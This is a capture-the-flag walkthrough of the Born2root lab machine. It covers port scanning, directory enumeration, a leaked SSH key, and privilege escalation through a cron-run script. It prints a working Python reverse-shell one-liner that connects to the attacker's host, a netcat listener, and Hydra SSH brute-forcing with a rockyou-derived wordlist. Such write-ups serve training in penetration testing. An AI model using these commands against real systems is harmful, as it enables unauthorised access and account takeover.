# Born2root

## Nmap

```
sudo nmap 192.168.196.49 -p- -sS -sV  

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
44532/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Jumping straight into Port 80 we come to the landing page for a company named 'Secretsec'. Secretsec appear to provide defensive secutity operations to potential clients.

![](<../../../.gitbook/assets/image (1444).png>)

Immediately we have three names available to us:

* Martin
* Hadi
* Jimmy

I added the users to a text file and ran Hydra against the names for `SSH`. Unfortunately after sometime this did not provide any results and is unlikely to be the intended path.

![](<../../../.gitbook/assets/image (1450).png>)

Next I decided to run feroxbuster to enumerate directories and web pages.

```
feroxbuster --url http://192.168.196.49/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,300,301 --auto-tune -d 2 
```

![](<../../../.gitbook/assets/image (1445).png>)

Of course robots.txt looks interesting. Reading the contents of this file shows the following results:

```
User-agent: *
Disallow: /wordpress-blog
Disallow: /files
```

Checking /files reveals no interesting information.

![](<../../../.gitbook/assets/image (1446).png>)

Of course /wordpress-blog/ is a troll.

![](<../../../.gitbook/assets/image (1447).png>)

Running feroxbuster on /wordpress-blog/ produced no further information and I was unable to extract any information otherwise.

Looking at the feroxbuster results I decided to have a quick look at /icons/ and right at the top we have a non default TXT file.

![](<../../../.gitbook/assets/image (1448).png>)

Opening the text file we are given a RSA key.

![](<../../../.gitbook/assets/image (1449).png>)

Since we know of three potential users on the target machine we can do a little bit of guess work with the key. First copy the key to the attacking machine and set the correct permissions.

```
chmod 600 id_rsa
```

We can then connect in as the user martin.

```
ssh -i id_rsa martin@192.168.214.49
```

![](<../../../.gitbook/assets/image (1452).png>)

It appears you can enter anything to skip the password prompt.... I then tried to upload `linpeas` with `wget` and `curl` and was unable to do so as per below:

![](<../../../.gitbook/assets/image (1453).png>)

We can upload via `SSH` however.

```
scp -i id_rsa /home/kali/scripts/linpeas.sh martin@192.168.214.49:/home/martin/linpeas.sh
```

After running linpeas we identify the file /tmp/sekurity.py is executed every five minutes in the context of the user jimmy.

![](<../../../.gitbook/assets/image (1454).png>)

When checking for the file we find it does not exists. As such we can create a python reverse shell file and call it sekurity.py.

First I used nano to create and start editing the python file. In which I passed a python reverse shell into.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.214",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![](<../../../.gitbook/assets/image (1455).png>)

After saving the file I set a `netcat` listener on my attacking machine.

```
sudo nc -lvp 80
```

Soon landing a shell as the user jimmy.

![](<../../../.gitbook/assets/image (1456).png>)

Looking at the contents of jimmy's home directory we see a binary with the root SUID bit set.

![](<../../../.gitbook/assets/image (1457).png>)

Running the binary pings local host and shows `ifconfig` information. I was unable to execute with any extra commands for exploitation. Running strings on the binary shows the 'echo' command without a fully defined path.

I did try creating my own malicious echo binary on jimmy's home directory and changing path to execute this directory first. This did not work for some reason.

Desperate enough at this point I grepped rockyou.txt for our last remaining user 'hadi' and sent the results to a text file.

```
cat /usr/share/wordlists/rockyou.txt | grep hadi > /home/kali/scripts/bruteforce/hadi.txt 
```

I then used the text file with Hydra to bruteforce SSH which actually worked.

![](<../../../.gitbook/assets/image (1458).png>)

![](<../../../.gitbook/assets/image (1459).png>)

After connecting as hadi I got stuck again and out of sheer desperation tried switching to root with the password of 'hadi123' which worked...

![](<../../../.gitbook/assets/image (1460).png>)
